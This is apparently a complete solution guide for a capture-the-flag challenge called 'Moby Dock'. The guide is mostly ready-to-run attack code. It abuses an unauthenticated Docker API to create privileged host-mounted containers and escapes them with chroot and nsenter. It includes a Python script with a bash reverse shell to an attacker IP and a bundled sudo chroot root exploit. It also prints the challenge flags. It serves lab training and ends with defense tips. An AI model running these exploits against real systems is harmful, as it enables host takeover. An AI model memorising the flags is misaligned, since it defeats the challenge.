# Moby Dock - Complete Solution Guide

## Challenge Overview
Moby Dock is a Boot2Root challenge featuring three stages of exploitation:
1. **Initial Access**: Docker API Exploitation (SSRF or Direct API Access)
2. **User Privilege**: Docker Container Escape  
3. **Root Privilege**: Docker Privilege Escalation (nsenter + PID namespace sharing)

## Flags
- **flag1.txt**: `H7CTF{d0ck3r_4p1_3xp0s3d_w1th0ut_4uth_1s_d34dly_d4ng3r0us}` (Container)
- **flag2.txt**: `H7CTF{c0nt41n3r_br34k0ut_pr1v1l3g3d_3sc4p3_t0_h0st_succ3ssful}` (User)
- **flag3.txt**: `H7CTF{d0ck3r_esc4p3_v1a_n4m3sp4c3_sh4r1ng_and_nsent3r}` (Root)

---

## Stage 1: Initial Reconnaissance & Docker API Exploitation

### Step 1.1: Initial Scanning
```bash
# Scan the target
nmap -sC -sV -p- 192.168.56.10

# Expected output:
# PORT     STATE SERVICE
# 22/tcp   open  ssh
# 2375/tcp open  docker  Docker API
# 8080/tcp open  http    Flask
```

### Step 1.2: Docker API Discovery

**Method A: Direct Docker API Access**
```bash
# Check if Docker API is exposed
curl http://192.168.56.10:2375/version

# List running containers
curl http://192.168.56.10:2375/containers/json

# Get container details
curl http://192.168.56.10:2375/containers/json?all=1
```

**Method B: SSRF via Web Portal**
```bash
# Access the web portal
firefox http://192.168.56.10:8080

# Use the form to query internal Docker API
URL: http://localhost:2375/version
URL: http://localhost:2375/containers/json
```

### Step 1.3: Docker API Exploitation - Create Malicious Container

**Option 1: Get Flag1 from Existing Container**
```bash
# List containers
CONTAINER_ID=$(curl -s http://192.168.56.10:2375/containers/json | jq -r '.[0].Id')

# Execute command in container to read flag
curl -X POST "http://192.168.56.10:2375/containers/$CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout": true, "Cmd": ["cat", "/flag1.txt"]}'

# Get exec ID from response and start it
EXEC_ID="<exec_id_from_response>"
curl -X POST "http://192.168.56.10:2375/exec/$EXEC_ID/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach": false}'
```

**Option 2: Create Privileged Container with Host Mount**
```bash
# Create a privileged container with host filesystem mounted
curl -X POST http://192.168.56.10:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh"],
    "Privileged": true,
    "Binds": ["/:/hostfs:rw"],
    "NetworkMode": "host",
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/hostfs:rw"]
    }
  }'

# Start the container (get container ID from response)
CONTAINER_ID="<container_id>"
curl -X POST http://192.168.56.10:2375/containers/$CONTAINER_ID/start

# Execute shell in container
curl -X POST "http://192.168.56.10:2375/containers/$CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Tty": true, "Cmd": ["/bin/sh"]}'
```

---

## Stage 2: Container Escape to Host

### Step 2.1: Using Docker Socket Mount
```bash
# From inside a privileged container with host mount
chroot /hostfs /bin/bash

# Or if /var/run/docker.sock is accessible
docker -H unix:///hostfs/var/run/docker.sock run -it --rm \
  -v /:/hostfs alpine chroot /hostfs /bin/bash
```

### Step 2.2: Using Privileged Container + nsenter
```bash
# Inside privileged container
# Get host PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Now you're on the host
whoami  # abu or root depending on setup
```

### Step 2.3: Alternative - Docker API to Host Shell
```python
#!/usr/bin/env python3
# exploit_docker_api.py

import requests
import json
import base64
import time

DOCKER_HOST = "192.168.56.10:2375"

def create_malicious_container():
    """Create a privileged container with host filesystem access"""
    
    # Container config
    config = {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "while true; do sleep 1; done"],
        "Privileged": True,
        "HostConfig": {
            "Privileged": True,
            "Binds": ["/:/hostfs:rw"],
            "NetworkMode": "host",
            "PidMode": "host"
        }
    }
    
    # Create container
    r = requests.post(f"http://{DOCKER_HOST}/containers/create", 
                     json=config)
    container_id = r.json()['Id']
    print(f"[+] Created container: {container_id[:12]}")
    
    # Start container
    requests.post(f"http://{DOCKER_HOST}/containers/{container_id}/start")
    print(f"[+] Started container")
    time.sleep(2)
    
    return container_id

def exec_command(container_id, cmd):
    """Execute command in container"""
    
    # Create exec instance
    exec_config = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": cmd
    }
    
    r = requests.post(f"http://{DOCKER_HOST}/containers/{container_id}/exec",
                     json=exec_config)
    exec_id = r.json()['Id']
    
    # Start exec
    r = requests.post(f"http://{DOCKER_HOST}/exec/{exec_id}/start",
                     json={"Detach": False})
    
    return r.text

def get_flag1(container_id):
    """Read flag1 from container"""
    cmd = ["cat", "/flag1.txt"]
    output = exec_command(container_id, cmd)
    print(f"\n[+] Flag 1: {output}")

def get_flag2(container_id):
    """Read flag2 from host via chroot"""
    cmd = ["/bin/sh", "-c", "chroot /hostfs cat /home/abu/flag2.txt"]
    output = exec_command(container_id, cmd)
    print(f"\n[+] Flag 2: {output}")

def get_reverse_shell(container_id, attacker_ip, attacker_port):
    """Get reverse shell on host"""
    cmd = ["/bin/sh", "-c", 
           f"chroot /hostfs /bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"]
    exec_command(container_id, cmd)

if __name__ == "__main__":
    print("[*] Exploiting exposed Docker API...")
    
    # List existing containers (to find flag-container)
    r = requests.get(f"http://{DOCKER_HOST}/containers/json?all=1")
    containers = r.json()
    
    print(f"[*] Found {len(containers)} containers")
    
    # Try to get flag1 from existing container
    if containers:
        flag_container = containers[0]['Id']
        print(f"[*] Checking existing container for flag1...")
        get_flag1(flag_container)
    
    # Create our malicious container for host access
    container_id = create_malicious_container()
    
    # Get flag2 from host
    get_flag2(container_id)
    
    print("\n[*] For interactive access, start a listener and get reverse shell:")
    print("    nc -lvnp 4444")
    print(f"    get_reverse_shell('{container_id[:12]}', 'YOUR_IP', 4444)")
```

### Step 2.4: Verify Host Access
```bash
# Once on the host
cat /home/abu/flag2.txt
# Flag: H7CTF{c0nt41n3r_br34k0ut_pr1v1l3g3d_3sc4p3_t0_h0st_succ3ssful}
```

---

## Stage 3: Privilege Escalation via Docker

### Step 3.1: Enumerate User Privileges
```bash
# Check what groups you're in
id
groups

# Output should show:
# abu docker

# This is the key - docker group membership!
```

### Step 3.2: Explore Docker Access
```bash
# Check Docker access
docker ps

# List available images
docker images
# Output:
# REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
# alpine       latest    xxx            2 weeks ago   7.73MB
# busybox      latest    xxx            2 weeks ago   4.26MB

# Check if you can run containers
docker run --rm alpine echo "Docker access confirmed"
```

### Step 3.3: Docker Privilege Escalation - nsenter Technique

**Understanding the Technique:**

Linux containers use **namespaces** for isolation. Docker allows containers to share the host's PID namespace with `--pid=host`. Combined with the `nsenter` tool, we can "jump" from the container into the host's context.

**Key Concepts:**
- **PID Namespace**: Isolates process IDs. With `--pid=host`, container sees ALL host processes
- **nsenter**: Tool to enter another process's namespaces
- **CAP_SYS_ADMIN**: Capability needed to manipulate namespaces
- **PID 1**: The init/systemd process on the host

**The Attack Chain:**
```
1. Create container with host PID namespace (--pid=host)
2. Add SYS_ADMIN capability (--cap-add=SYS_ADMIN)
3. Use nsenter to enter PID 1's namespaces
4. Result: Root shell on host!
```

### Step 3.4: Execute the Exploit

**Method 1: Using the automated script**
```bash
cd ~
chmod +x /vagrant/exploits/docker_nsenter_privesc.sh
/vagrant/exploits/docker_nsenter_privesc.sh
```

**Method 2: Manual exploitation (recommended for learning)**

```bash
# Step 1: Create privileged container with host PID namespace
docker run --rm -it --pid=host --privileged alpine sh

# Step 2: Inside the container, use nsenter to enter host's namespaces
nsenter --target 1 --mount --uts --ipc --net /bin/sh

# Step 3: Verify you're on the host
whoami  # root
hostname  # mobydock
```

**One-Liner (Recommended):**
```bash
docker run --rm -it --pid=host --privileged alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/sh
```

### Step 3.5: Understanding the Attack

**Command Breakdown:**
- `--pid=host`: Share host's PID namespace (see all host processes)
- `--privileged`: Grant ALL capabilities (including SYS_ADMIN, SYS_PTRACE)
- `nsenter --target 1`: Enter PID 1's (host init) namespaces
- Result: Root shell on host!

**Why It Works:**
1. Docker group = effectively root access
2. `--pid=host` breaks container isolation
3. `nsenter` lets you "jump" from container to host context
4. You're now root on the host system! 🎉

### Step 3.6: Get the Final Flag
```bash
# Check privileges
whoami  # root
id      # uid=0(root) gid=0(root)

# Get final flag
cat /root/flag3.txt
# Flag: H7CTF{d0ck3r_esc4p3_v1a_n4m3sp4c3_sh4r1ng_and_nsent3r}

# Celebrate!
echo "Challenge Complete! All flags captured!"
```

### Alternative Docker Escape Methods

**Method A: Simple Volume Mount (Easier)**
```bash
docker run -v /:/hostfs --rm -it alpine chroot /hostfs bash
cat /root/flag3.txt
```

**Method B: Privileged Container**
```bash
docker run --privileged --rm -it alpine
mkdir /host && mount /dev/sda1 /host && chroot /host
```

---

## Quick Automated Exploitation Script

```python
#!/usr/bin/env python3
# full_exploit.py - Complete automated exploitation

import requests
import subprocess
import time
import sys

DOCKER_HOST = "192.168.56.10:2375"

def exploit_docker_api():
    """Stage 1 & 2: Docker API + Container Escape"""
    print("[Stage 1] Exploiting Docker API...")
    
    # Create privileged container
    config = {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "while true; do sleep 1; done"],
        "HostConfig": {
            "Privileged": True,
            "Binds": ["/:/hostfs:rw"],
            "PidMode": "host"
        }
    }
    
    r = requests.post(f"http://{DOCKER_HOST}/containers/create", json=config)
    cid = r.json()['Id']
    requests.post(f"http://{DOCKER_HOST}/containers/{cid}/start")
    time.sleep(2)
    
    # Get flags via exec
    exec_cfg = {"AttachStdout": True, "Cmd": ["cat", "/flag1.txt"]}
    r = requests.post(f"http://{DOCKER_HOST}/containers/{cid}/exec", json=exec_cfg)
    eid = r.json()['Id']
    r = requests.post(f"http://{DOCKER_HOST}/exec/{eid}/start", json={"Detach": False})
    print(f"[+] Flag1: {r.text.strip()}")
    
    # Get flag2 from host
    exec_cfg = {"AttachStdout": True, 
                "Cmd": ["/bin/sh", "-c", "chroot /hostfs cat /home/abu/flag2.txt"]}
    r = requests.post(f"http://{DOCKER_HOST}/containers/{cid}/exec", json=exec_cfg)
    eid = r.json()['Id']
    r = requests.post(f"http://{DOCKER_HOST}/exec/{eid}/start", json={"Detach": False})
    print(f"[+] Flag2: {r.text.strip()}")
    
    return cid

def exploit_sudo_chroot(container_id):
    """Stage 3: Privilege escalation via CVE-2025-32463"""
    print("[Stage 3] Exploiting CVE-2025-32463 (Sudo Chroot)...")
    
    exploit_script = """
#!/bin/bash
set -e
STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
cd "$STAGE"
cat > woot1337.c <<'EEOOFF'
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
__attribute__((constructor))
void woot(void) {
    FILE *f = fopen("/tmp/root_flag.txt", "w");
    FILE *flag = fopen("/root/flag3.txt", "r");
    if (flag) {
        char buf[1024];
        while (fgets(buf, sizeof(buf), flag)) {
            fprintf(f, "%s", buf);
        }
        fclose(flag);
    }
    fclose(f);
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
}
EEOOFF
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
echo "root:x:0:" > woot/etc/group
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c 2>/dev/null
sudo -R woot woot 2>/dev/null || true
cat /tmp/root_flag.txt 2>/dev/null
rm -rf "$STAGE" /tmp/root_flag.txt 2>/dev/null
"""
    
    # Execute via container
    exec_cfg = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", f"chroot /hostfs /bin/bash -c '{exploit_script}'"]
    }
    
    r = requests.post(f"http://{DOCKER_HOST}/containers/{container_id}/exec", 
                     json=exec_cfg)
    eid = r.json()['Id']
    r = requests.post(f"http://{DOCKER_HOST}/exec/{eid}/start", 
                     json={"Detach": False})
    
    print(f"[+] Flag3: {r.text}")

if __name__ == "__main__":
    print("=" * 60)
    print("Moby Dock - Full Exploitation Chain")
    print("=" * 60)
    
    cid = exploit_docker_api()
    time.sleep(2)
    exploit_sudo_chroot(cid)
    
    print("\n[+] All flags captured!")
```

---

## Tools Used
- `nmap` - Network scanning
- `curl` - HTTP requests to Docker API
- `docker` CLI (optional, with `-H` flag)
- Python `requests` library
- `gcc` - Compile exploit
- `netcat` - Reverse shell listener

## References
- Docker API Documentation: https://docs.docker.com/engine/api/
- CVE-2025-32463: https://www.exploit-db.com/exploits/52352
- Container Escape Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security

---

## Defense Recommendations

1. **Never expose Docker API without authentication**
2. **Use TLS and certificate authentication for remote Docker API**
3. **Avoid running privileged containers**
4. **Keep sudo updated to latest version**
5. **Implement proper SSRF protections in web applications**
6. **Use Docker security scanning tools**
7. **Apply principle of least privilege**
